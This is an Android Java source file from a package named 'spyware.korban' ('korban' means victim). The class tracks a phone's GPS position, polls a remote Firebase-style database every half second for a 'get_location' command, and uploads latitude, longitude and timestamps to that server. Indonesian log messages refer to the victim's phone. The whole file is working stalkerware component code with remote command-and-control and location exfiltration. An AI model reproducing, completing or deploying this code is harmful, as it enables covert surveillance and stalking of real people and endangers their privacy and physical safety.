package com.spyware.korban;

import android.Manifest;
import android.content.Context;
import android.content.pm.PackageManager;
import android.location.Location;
import android.location.LocationListener;
import android.location.LocationManager;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.os.Looper;
import android.util.Log;

import org.json.JSONObject;

import java.io.BufferedReader;
import java.io.DataOutputStream;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.URL;

public class LocationHelper {

    private static final String TAG = "LOC_HELPER";
    private static final String FIREBASE_BASE =
        "URL_LU/";

    private Context ctx;
    private String deviceId;
    private LocationManager lm;
    private LocationListener gpsListener;
    private Handler handler = new Handler(Looper.getMainLooper());
    private boolean isRunning = false;
    private volatile long lastUpdate = 0;
    private static final long MIN_UPDATE_INTERVAL = 3000;
    private volatile boolean checking = false;

    public LocationHelper(Context context) {
        this.ctx = context;
        this.deviceId = Build.MODEL.replace(" ", "_");
        this.lm = (LocationManager) ctx.getSystemService(Context.LOCATION_SERVICE);
    }

    public void start() {
        if (isRunning) return;
        isRunning = true;
        Log.d(TAG, "LocationHelper started for device: " + deviceId);

        // ═══ KUNCI: HANYA GPS, TIDAK ADA WIFI ═══
        gpsListener = new LocationListener() {
            @Override
            public void onLocationChanged(Location location) {
                if (location == null) return;
                // ═══ KUNCI: Cek provider GPS ═══
                if (!LocationManager.GPS_PROVIDER.equals(location.getProvider())) {
                    Log.d(TAG, "⚠️ Bukan GPS, diabaikan: " + location.getProvider());
                    return;
                }

                long now = System.currentTimeMillis();
                if (now - lastUpdate < MIN_UPDATE_INTERVAL) return;
                lastUpdate = now;
                Log.d(TAG, "📍 GPS update: acc=" + location.getAccuracy() + "m");
                sendLocation(location);
            }

            @Override
            public void onStatusChanged(String provider, int status, Bundle extras) {}
            @Override
            public void onProviderEnabled(String provider) {
                Log.d(TAG, "GPS ENABLED");
            }
            @Override
            public void onProviderDisabled(String provider) {
                Log.d(TAG, "GPS DISABLED");
            }
        };

        try {
            // ═══ CEK PERMISSION ═══
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                if (ctx.checkSelfPermission(Manifest.permission.ACCESS_FINE_LOCATION)
                        != PackageManager.PERMISSION_GRANTED
                        && ctx.checkSelfPermission(Manifest.permission.ACCESS_COARSE_LOCATION)
                        != PackageManager.PERMISSION_GRANTED) {
                    Log.e(TAG, "❌ No location permission!");
                    return;
                }
            }

            if (lm == null) {
                Log.e(TAG, "❌ LocationManager null!");
                return;
            }

            // ═══ CEK GPS ENABLED ═══
            boolean gpsEnabled = lm.isProviderEnabled(LocationManager.GPS_PROVIDER);
            Log.d(TAG, "GPS enabled: " + gpsEnabled);

            if (!gpsEnabled) {
                Log.e(TAG, "❌ GPS OFF! Nyalakan GPS di HP korban");
                return;
            }

            // ═══ REGISTER HANYA GPS ═══
            lm.requestLocationUpdates(
                LocationManager.GPS_PROVIDER,
                3000,
                0,
                gpsListener,
                Looper.getMainLooper()
            );
            Log.d(TAG, "✅ GPS provider registered (WiFi DIABAIKAN)");

            // ═══ KIRIM LAST KNOWN GPS ═══
            Location lastGps = lm.getLastKnownLocation(LocationManager.GPS_PROVIDER);
            if (lastGps != null) {
                Log.d(TAG, "Send initial GPS: acc=" + lastGps.getAccuracy() + "m");
                lastUpdate = 0;
                sendLocation(lastGps);
            } else {
                Log.d(TAG, "No last known GPS — tunggu fix");
            }

        } catch (Exception e) {
            Log.e(TAG, "start: " + e.getMessage());
        }

        handler.postDelayed(commandCheckTask, 1000);
    }

    private final Runnable commandCheckTask = new Runnable() {
        @Override
        public void run() {
            if (!isRunning) return;
            checkLocationCommand();
            handler.postDelayed(this, 500);
        }
    };

    private void checkLocationCommand() {
        if (checking) return;
        checking = true;
        new Thread(new Runnable() {
            @Override
            public void run() {
                HttpURLConnection conn = null;
                BufferedReader reader = null;
                try {
                    URL url = new URL(FIREBASE_BASE + deviceId + "/commands.json");
                    conn = (HttpURLConnection) url.openConnection();
                    conn.setRequestMethod("GET");
                    conn.setConnectTimeout(5000);
                    conn.setReadTimeout(5000);

                    if (conn.getResponseCode() == 200) {
                        InputStream is = conn.getInputStream();
                        reader = new BufferedReader(new InputStreamReader(is));
                        StringBuilder sb = new StringBuilder();
                        String line;
                        while ((line = reader.readLine()) != null) sb.append(line);

                        String data = sb.toString().trim();
                        if (data != null && !data.equals("null") && data.length() > 5) {
                            if (data.contains("get_location")) {
                                Log.d(TAG, "📩 Location command received!");
                                requestFreshLocation();
                            }
                        }
                    }
                } catch (Exception e) {
                } finally {
                    try { if (reader != null) reader.close(); } catch (Exception e) {}
                    if (conn != null) conn.disconnect();
                    checking = false;
                }
            }
        }).start();
    }

    private void requestFreshLocation() {
        try {
            if (lm == null) return;
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                if (ctx.checkSelfPermission(Manifest.permission.ACCESS_FINE_LOCATION)
                        != PackageManager.PERMISSION_GRANTED
                        && ctx.checkSelfPermission(Manifest.permission.ACCESS_COARSE_LOCATION)
                        != PackageManager.PERMISSION_GRANTED) {
                    return;
                }
            }

            if (!lm.isProviderEnabled(LocationManager.GPS_PROVIDER)) {
                Log.e(TAG, "❌ GPS OFF, gak bisa kirim lokasi");
                return;
            }

            // ═══ KIRIM LAST KNOWN GPS ═══
            Location lastGps = lm.getLastKnownLocation(LocationManager.GPS_PROVIDER);
            if (lastGps != null) {
                Log.d(TAG, "Send last known GPS: acc=" + lastGps.getAccuracy() + "m");
                lastUpdate = 0;
                sendLocation(lastGps);
            }

            // ═══ REQUEST FRESH GPS ═══
            Log.d(TAG, "Requesting fresh GPS...");
            try {
                lm.requestSingleUpdate(
                    LocationManager.GPS_PROVIDER,
                    gpsListener,
                    Looper.getMainLooper()
                );
            } catch (Exception e) {
                Log.e(TAG, "requestSingleUpdate: " + e.getMessage());
            }

        } catch (Exception e) {
            Log.e(TAG, "requestFresh: " + e.getMessage());
        }
    }

    private void sendLocation(final Location loc) {
        // ═══ KUNCI: Double check provider GPS ═══
        if (!LocationManager.GPS_PROVIDER.equals(loc.getProvider())) {
            Log.d(TAG, "⚠️ Bukan GPS, skip: " + loc.getProvider());
            return;
        }

        new Thread(new Runnable() {
            @Override
            public void run() {
                HttpURLConnection conn = null;
                DataOutputStream os = null;
                try {
                    String url = FIREBASE_BASE + deviceId + "/location.json";
                    conn = (HttpURLConnection) new URL(url).openConnection();
                    conn.setRequestMethod("PUT");
                    conn.setRequestProperty("Content-Type", "application/json");
                    conn.setDoOutput(true);
                    conn.setConnectTimeout(5000);
                    conn.setReadTimeout(5000);

                    JSONObject obj = new JSONObject();
                    obj.put("lat", loc.getLatitude());
                    obj.put("lng", loc.getLongitude());
                    obj.put("accuracy", loc.getAccuracy());
                    obj.put("provider", "gps");
                    obj.put("timestamp", System.currentTimeMillis());

                    os = new DataOutputStream(conn.getOutputStream());
                    os.write(obj.toString().getBytes("UTF-8"));
                    os.flush();
                    conn.getResponseCode();
                    Log.d(TAG, "✅ Sent GPS: acc=" + loc.getAccuracy() + "m "
                        + loc.getLatitude() + "," + loc.getLongitude());
                } catch (Exception e) {
                    Log.e(TAG, "sendLocation: " + e.getMessage());
                } finally {
                    try { if (os != null) os.close(); } catch (Exception e) {}
                    try { if (conn != null) conn.disconnect(); } catch (Exception e) {}
                }
            }
        }).start();
    }

    public void stop() {
        isRunning = false;
        try {
            if (lm != null && gpsListener != null) {
                lm.removeUpdates(gpsListener);
            }
        } catch (Exception e) {}
        handler.removeCallbacksAndMessages(null);
        Log.d(TAG, "LocationHelper stopped");
    }
}